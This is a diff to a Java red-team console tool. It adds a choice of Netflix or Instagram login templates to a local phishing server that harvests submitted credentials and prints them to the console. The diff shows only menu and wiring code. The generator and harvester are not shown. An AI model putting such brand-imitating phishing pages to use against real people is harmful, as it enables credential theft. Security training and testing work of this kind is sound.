@@ -149,14 +149,31 @@ public class RedTeamCli {
     }
 
     private void startPhishingServer(Scanner scan) {
+        System.out.println("\nChoisissez le template de connexion :");
+        System.out.println("  [1] Netflix");
+        System.out.println("  [2] Instagram");
+        System.out.print("Choix (1-2): ");
+        String choice = scan.nextLine();
+        if (choice != null) choice = choice.trim();
+        String[] names = PhishingPageGenerator.TEMPLATE_NAMES;
+        String template = null;
+        int idx = parseInt(choice, 0);
+        if (idx >= 1 && idx <= names.length) {
+            template = names[idx - 1];
+        }
         int port = 8080;
         String host = "127.0.0.1";
         try {
-            PhishingHttpServer srv = new PhishingHttpServer(host, port, new PhishingPageGenerator(), new CredentialHarvester());
+            PhishingHttpServer srv = new PhishingHttpServer(host, port, new PhishingPageGenerator(), new CredentialHarvester(), template);
             srv.start();
             System.out.println("\n>>> Serveur phishing démarré sur http://" + host + ":" + port);
-            System.out.println(">>> Ouvrez cette URL dans un navigateur. Les identifiants soumis s'afficheront ici.");
-            System.out.println(">>> Appuyez sur [Entrée] pour revenir au menu (le serveur continue en arrière-plan).");
+            if (template != null) {
+                System.out.println(">>> Template: " + template + " (page de connexion réaliste)");
+            } else {
+                System.out.println(">>> Ouvrez l'URL pour choisir un template.");
+            }
+            System.out.println(">>> Les identifiants soumis s'afficheront ici.");
+            System.out.println(">>> Appuyez sur [Entrée] pour revenir au menu.");
             scan.nextLine();
         } catch (Exception e) {
             System.out.println("Erreur: " + e.getMessage());
